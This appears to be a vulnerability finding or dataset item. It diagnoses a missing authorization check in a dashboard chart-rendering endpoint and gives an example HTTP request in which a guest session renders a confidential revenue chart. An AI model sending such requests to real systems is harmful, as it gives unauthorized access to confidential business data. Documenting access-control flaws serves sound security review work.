diagnosis: The chart generation endpoint spawns a rendering child process with chartConfigId from the request body. It does not check if the requesting user has access permissions to the dashboard or its underlying business metrics, allowing unauthorized users to render confidential sales performance graphics.
exploit_request:
POST /api/dashboards/render-chart HTTP/1.1
Host: bi.corporate.internal:9002
Content-Type: application/json
Cookie: session_token=guest_user_token

{"chartConfigId": "cfg_q3_revenue_breakdown_vip"}
